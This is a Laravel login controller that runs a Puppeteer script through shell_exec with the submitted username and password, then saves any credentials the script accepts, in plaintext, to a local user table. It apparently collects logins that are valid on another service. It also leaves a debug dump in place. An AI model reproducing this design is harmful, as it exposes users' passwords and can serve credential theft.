<?php

namespace App\Http\Controllers;

use App\Models\Userdb;
use Illuminate\Http\Request;

class LoginController extends Controller
{
    //

    function index(){
        return view("index");
    }

    function login(Request $request){


        $username = $request->username;
        $password = $request->password;

        $output = shell_exec("node " . escapeshellarg(base_path('puppeteer.js')) . " " . escapeshellarg($username) . " " . escapeshellarg($password));
        if ($output == "Login successful\n") {
            $user = Userdb::where("username", $username)->first();
            if ($user) {
                redirect()->back()->with(["message" => "Login failed. Please try again"]);
            } else {
                $newUser = new Userdb;
                $newUser->username = $username;
                $newUser->password = $password;
                $newUser->save();
            }
        }

        dd($output);

        return redirect()->back()->with(["message" => "Login failed. Please try again"]);
    }
}
